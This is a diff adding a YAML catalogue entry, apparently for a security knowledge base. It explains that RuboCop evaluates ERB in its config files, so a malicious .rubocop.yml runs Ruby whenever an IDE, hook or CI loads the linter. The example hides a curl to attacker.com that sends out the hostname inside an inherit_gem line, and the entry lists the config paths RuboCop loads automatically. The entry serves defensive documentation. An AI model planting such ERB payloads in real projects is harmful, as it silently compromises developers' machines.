@@ -1,0 +1,50 @@
+name: Ruby RuboCop Config File
+id: ruby-rubocop
+description: >
+  RuboCop is the standard Ruby linter and formatter. Its configuration files
+  are YAML, but RuboCop processes them through ERB before parsing, meaning any
+  ERB expression inside the config file is executed as Ruby the moment RuboCop
+  loads its configuration.
+
+  Because linters are routinely invoked automatically by IDEs on every file
+  save, by pre-commit hooks, and by CI pipelines, a backdoored `.rubocop.yml`
+  executes without any deliberate developer action beyond opening the project.
+tags:
+  - ruby
+  - linter
+  - code-execution
+  - config
+  - ide
+
+exploitation: |
+  RuboCop passes its YAML config through ERB before parsing it, so any `<% %>`
+  or `<%= %>` tag in the file runs as Ruby. The payload fires the instant
+  RuboCop reads its configuration — which happens automatically when an IDE
+  (VS Code with Ruby LSP / Solargraph, RubyMine, etc.) invokes the linter on
+  file save, or when a developer runs `rubocop` from the command line.
+
+  ```yaml
+  # Omakase Ruby styling for Rails
+  inherit_gem: { rubocop-rails-omakase: rubocop.yml <% `curl https://attacker.com/?h=#{`hostname`}` %>}
+
+  # Overwrite or add rules to create your own house style
+  #
+  # Layout/SpaceInsideArrayLiteralBrackets:
+  #   Enabled: false
+  ```
+
+  ### Affected config file locations
+
+  RuboCop searches for configuration files by walking up the directory tree
+  from the file being linted. Any of the following will be loaded automatically:
+
+  - `.rubocop.yml`
+  - `.config/.rubocop.yml`
+  - `.config/rubocop/config.yml`
+
+  Placing a malicious config in any of these paths inside a repository is
+  enough for it to be evaluated on every linter run.
+
+references:
+  - url: https://docs.rubocop.org/rubocop/latest/configuration.html
+    description: RuboCop configuration documentation
